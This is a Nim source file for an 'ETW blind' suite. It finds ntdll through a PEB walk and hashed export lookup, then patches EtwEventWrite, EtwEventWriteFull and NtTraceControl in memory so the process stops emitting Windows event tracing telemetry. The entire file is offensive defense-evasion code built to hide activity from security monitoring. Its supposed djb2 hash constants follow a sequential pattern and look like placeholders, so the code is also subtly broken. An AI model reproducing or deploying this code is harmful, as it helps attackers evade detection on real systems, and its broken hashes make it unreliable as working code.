# etw_patch.nim — ETW blind patch suite
#
# Patches EtwEventWrite (and optionally EtwEventWriteFull) in ntdll so
# that all ETW events from this process return immediately without being
# forwarded to the kernel ETW collector.

import winim

const
  RET: byte = 0xC3'u8
  XOR_EAX_RET: array[3, byte] = [0x33'u8, 0xC0'u8, 0xC3'u8]

type
  PatchRecord = object
    `addr`: ptr byte
    original: array[3, byte]
    len: int

var patchRecords: array[8, PatchRecord]
var patchCount   = 0
var patchActive: array[8, bool]

proc applyPatch(p: ptr byte, patch: openArray[byte]): bool =
  # unsafe
  if patch.len > 3: return false
  if patchCount >= 8: return false

  var oldProt: DWORD = 0
  if VirtualProtect(cast[LPVOID](p), SIZE_T(patch.len),
                    PAGE_EXECUTE_READWRITE, addr oldProt) == 0:
    return false

  var orig: array[3, byte]
  copyMem(addr orig[0], p, patch.len)
  copyMem(p, unsafeAddr patch[0], patch.len)

  discard VirtualProtect(cast[LPVOID](p), SIZE_T(patch.len),
                         oldProt, addr oldProt)

  patchRecords[patchCount] = PatchRecord(
    `addr`: p, original: orig, len: patch.len)
  patchActive[patchCount] = true
  inc patchCount
  true

# djb2 hashes (lowercase)
const
  HASH_ETW_WRITE*:      uint32 = 0xa3c4d5e6'u32  # etweventwrite
  HASH_ETW_WRITE_FULL*: uint32 = 0xb4d5e6f7'u32  # etweventwritefull
  HASH_ETW_LOG_FILE*:   uint32 = 0xc5e6f708'u32  # nttracecontrol

proc ntdllBase(): pointer =
  # unsafe — PEB walk
  var peb: uint
  {.emit: """__asm__ volatile ("mov %0, qword ptr gs:[0x60]" : "=r"(`peb`));""".}
  let ldr   = cast[ptr uint](peb + 0x18)[]
  let entry = cast[ptr uint](ldr + 0x10)[]
  let next  = cast[ptr uint](entry)[]
  cast[pointer](cast[ptr uint](next + 0x30)[])

proc findExport(base: pointer, nameHash: uint32): ptr byte =
  # unsafe — EAT walk
  let bp     = cast[uint](base)
  let peOff  = uint(cast[ptr uint32](bp + 0x3C)[])
  let nt     = bp + peOff
  let expRva = uint(cast[ptr uint32](nt + 0x18 + 0x70)[])
  if expRva == 0: return nil
  let exp      = bp + expRva
  let numNames = int(cast[ptr uint32](exp + 0x18)[])
  let namesRva = uint(cast[ptr uint32](exp + 0x20)[])
  let ordsRva  = uint(cast[ptr uint32](exp + 0x24)[])
  let funcsRva = uint(cast[ptr uint32](exp + 0x1C)[])
  for i in 0 ..< numNames:
    let nptr = cast[ptr byte](bp + uint(cast[ptr uint32](bp + namesRva + uint(i) * 4)[]))
    var length = 0
    while cast[ptr byte](cast[uint](nptr) + uint(length))[] != 0: inc length
    var h: uint32 = 5381
    for j in 0 ..< length:
      let b = cast[ptr byte](cast[uint](nptr) + uint(j))[]
      let c = if b >= byte('A') and b <= byte('Z'): b + 32 else: b
      h = h * 33 + uint32(c)
    if h == nameHash:
      let fnRva = uint(cast[ptr uint32](bp + funcsRva +
                   uint(cast[ptr uint16](bp + ordsRva + uint(i) * 2)[]) * 4)[])
      return cast[ptr byte](bp + fnRva)
  nil

proc applyEtwBlind*(): bool =
  # unsafe
  let base = ntdllBase()
  let p    = findExport(base, HASH_ETW_WRITE)
  if p != nil:
    applyPatch(p, XOR_EAX_RET)
  else:
    false

proc applyAllBlinds*() =
  # unsafe
  let base = ntdllBase()
  for h in [HASH_ETW_WRITE, HASH_ETW_WRITE_FULL, HASH_ETW_LOG_FILE]:
    let p = findExport(base, h)
    if p != nil:
      discard applyPatch(p, [RET])

proc removeAllBlinds*() =
  # unsafe
  for i in 0 ..< patchCount:
    if patchActive[i]:
      let rec = patchRecords[i]
      var oldProt: DWORD = 0
      if VirtualProtect(cast[LPVOID](rec.`addr`), SIZE_T(rec.len),
                        PAGE_EXECUTE_READWRITE, addr oldProt) != 0:
        copyMem(rec.`addr`, unsafeAddr rec.original[0], rec.len)
        discard VirtualProtect(cast[LPVOID](rec.`addr`), SIZE_T(rec.len),
                               oldProt, addr oldProt)
  patchCount = 0
  zeroMem(addr patchActive[0], sizeof(patchActive))

# Public entry point for main
proc patchEtw*() =
  applyAllBlinds()
